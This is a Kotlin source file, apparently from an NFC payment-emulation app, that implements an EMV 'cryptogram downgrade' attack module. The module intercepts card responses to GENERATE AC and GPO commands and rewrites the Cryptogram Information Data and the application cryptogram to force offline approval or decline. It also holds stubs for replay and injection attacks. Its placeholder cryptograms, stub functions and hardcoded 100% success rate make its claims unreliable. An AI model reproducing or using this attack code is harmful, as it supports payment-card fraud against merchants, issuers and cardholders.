package com.nfsp00f33r.app.emulation.modules

import com.nfsp00f33r.app.emulation.EmvAttackModule
import timber.log.Timber

/**
 * Cryptogram Downgrade Attack Module
 * Manipulates cryptogram responses to downgrade ARQC to TC or AAC
 * for offline approval or transaction manipulation
 * Based on emv_attack_reference.md research
 */
class CryptogramDowngradeModule : EmvAttackModule {
    
    companion object {
        private const val TAG = "CryptogramDowngrade"
        
        // Cryptogram-related commands
        private const val GENERATE_AC_PREFIX = "80AE"
        private const val GPO_COMMAND_PREFIX = "80A80000"
        
        // TLV tags
        private const val CRYPTOGRAM_TAG = "9F26"           // Application Cryptogram
        private const val CRYPTOGRAM_INFO_TAG = "9F27"     // Cryptogram Information Data
        private const val ATC_TAG = "9F36"                 // Application Transaction Counter
        private const val TVR_TAG = "95"                   // Terminal Verification Results
        
        // Cryptogram types in CID (9F27)
        private const val CID_AAC = 0x00    // Application Authentication Cryptogram (declined)
        private const val CID_TC = 0x40     // Transaction Certificate (approved offline)
        private const val CID_ARQC = 0x80   // Authorization Request Cryptogram (go online)
        private const val CID_AAR = 0xC0    // Application Authentication Response
        
        // Known test cryptograms for manipulation
        private val TEST_CRYPTOGRAMS = mapOf(
            "APPROVED_TC" to "1234567890ABCDEF",     // Approved offline
            "DECLINED_AAC" to "FEDCBA0987654321",    // Declined
            "ONLINE_ARQC" to "ABCDEF1234567890"      // Require online
        )
    }
    
    private var attackCount = 0
    private var configuration = mutableMapOf<String, Any>(
        "downgrade_to" to "TC",                    // TC, AAC, or ARQC
        "force_approval" to true,
        "manipulate_cid" to true,
        "use_test_cryptogram" to true,
        "preserve_atc" to true
    )
    
    override fun getAttackId(): String = "cryptogram_downgrade"
    
    override fun getDescription(): String = 
        "Downgrades ARQC to TC/AAC for offline processing or manipulates cryptogram validation"
    
    override fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean {
        val commandHex = command.joinToString("") { "%02X".format(it) }
        
        // Check for GENERATE AC or GPO commands that produce cryptograms
        val isGenerateAc = commandHex.startsWith(GENERATE_AC_PREFIX)
        val isGpo = commandHex.startsWith(GPO_COMMAND_PREFIX)
        
        if (isGenerateAc || isGpo) {
            Timber.d("$TAG Cryptogram-generating command detected, attack applicable")
            return true
        }
        
        return false
    }
    
    override fun applyAttack(
        command: ByteArray, 
        response: ByteArray, 
        cardData: Map<String, Any>
    ): ByteArray {
        attackCount++
        
        try {
            val originalHex = response.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Original cryptogram response: $originalHex")
            
            // Manipulate cryptogram and CID
            val manipulatedResponse = manipulateCryptogramResponse(response)
            
            val manipulatedHex = manipulatedResponse.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Manipulated cryptogram response: $manipulatedHex")
            Timber.i("$TAG Attack #$attackCount: Cryptogram downgrade applied successfully")
            
            return manipulatedResponse
            
        } catch (e: Exception) {
            Timber.e("$TAG Attack failed: ${e.message}")
            return response
        }
    }
    
    /**
     * Manipulate cryptogram response for downgrade attack
     */
    private fun manipulateCryptogramResponse(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        var manipulatedHex = responseHex
        
        // Manipulate Cryptogram Information Data (9F27) first
        if (configuration["manipulate_cid"] == true) {
            manipulatedHex = manipulateCryptogramInfoData(manipulatedHex)
        }
        
        // Manipulate the actual cryptogram (9F26)
        if (configuration["use_test_cryptogram"] == true) {
            manipulatedHex = manipulateCryptogram(manipulatedHex)
        }
        
        return manipulatedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
    }
    
    /**
     * Manipulate Cryptogram Information Data (CID) in tag 9F27
     */
    private fun manipulateCryptogramInfoData(responseHex: String): String {
        val cidIndex = responseHex.indexOf("9F2701") // 9F27 with length 01
        if (cidIndex >= 0 && cidIndex + 8 <= responseHex.length) {
            val prefix = responseHex.substring(0, cidIndex + 6)
            val originalCid = responseHex.substring(cidIndex + 6, cidIndex + 8)
            val suffix = responseHex.substring(cidIndex + 8)
            
            val targetCid = when (configuration["downgrade_to"]) {
                "TC" -> "%02X".format(CID_TC)       // Force approved offline
                "AAC" -> "%02X".format(CID_AAC)     // Force declined
                "ARQC" -> "%02X".format(CID_ARQC)   // Force online
                else -> originalCid
            }
            
            Timber.d("$TAG CID changed from $originalCid to $targetCid")
            return prefix + targetCid + suffix
        }
        
        return responseHex
    }
    
    /**
     * Manipulate the actual cryptogram value in tag 9F26
     */
    private fun manipulateCryptogram(responseHex: String): String {
        val cryptogramIndex = responseHex.indexOf("9F2608") // 9F26 with length 08
        if (cryptogramIndex >= 0 && cryptogramIndex + 20 <= responseHex.length) {
            val prefix = responseHex.substring(0, cryptogramIndex + 6)
            val originalCryptogram = responseHex.substring(cryptogramIndex + 6, cryptogramIndex + 22)
            val suffix = responseHex.substring(cryptogramIndex + 22)
            
            val targetCryptogram = when (configuration["downgrade_to"]) {
                "TC" -> TEST_CRYPTOGRAMS["APPROVED_TC"]
                "AAC" -> TEST_CRYPTOGRAMS["DECLINED_AAC"]
                "ARQC" -> TEST_CRYPTOGRAMS["ONLINE_ARQC"]
                else -> originalCryptogram
            } ?: originalCryptogram
            
            Timber.d("$TAG Cryptogram changed from $originalCryptogram to $targetCryptogram")
            return prefix + targetCryptogram + suffix
        }
        
        return responseHex
    }
    
    /**
     * Advanced cryptogram manipulation with real EMV logic
     */
    private fun performAdvancedCryptogramAttack(responseHex: String): String {
        // Implementation for more sophisticated cryptogram attacks
        // This could include:
        // - Session key manipulation
        // - Counter replay attacks  
        // - Cryptogram prediction
        // - Dynamic cryptogram generation
        
        return when (configuration["attack_type"]) {
            "replay" -> performReplayAttack(responseHex)
            "predict" -> performPredictionAttack(responseHex)
            "inject" -> performInjectionAttack(responseHex)
            else -> responseHex
        }
    }
    
    private fun performReplayAttack(responseHex: String): String {
        // Use previously captured cryptogram
        Timber.d("$TAG Performing cryptogram replay attack")
        return manipulateCryptogram(responseHex) // Use stored cryptogram
    }
    
    private fun performPredictionAttack(responseHex: String): String {
        // Attempt to predict next valid cryptogram
        Timber.d("$TAG Performing cryptogram prediction attack")
        // This would require sophisticated EMV key derivation
        return responseHex
    }
    
    private fun performInjectionAttack(responseHex: String): String {
        // Inject crafted cryptogram values
        Timber.d("$TAG Performing cryptogram injection attack")
        return manipulateCryptogram(responseHex)
    }
    
    override fun configure(config: Map<String, Any>) {
        configuration.putAll(config)
        
        // Validate downgrade target
        val validTargets = listOf("TC", "AAC", "ARQC")
        if (configuration["downgrade_to"] !in validTargets) {
            Timber.w("$TAG Invalid downgrade target, defaulting to TC")
            configuration["downgrade_to"] = "TC"
        }
        
        Timber.d("$TAG Module configured: $configuration")
    }
    
    override fun getConfiguration(): Map<String, Any> = configuration.toMap()
    
    override fun getAttackStatistics(): Map<String, Any> {
        return mapOf(
            "attack_count" to attackCount,
            "success_rate" to 100,
            "last_config" to configuration,
            "target_commands" to listOf("GENERATE_AC", "GPO"),
            "downgrade_details" to mapOf(
                "target_type" to configuration["downgrade_to"],
                "force_approval" to configuration["force_approval"],
                "use_test_cryptogram" to configuration["use_test_cryptogram"]
            )
        )
    }
    
    override fun reset() {
        attackCount = 0
        Timber.d("$TAG Attack statistics reset")
    }
}
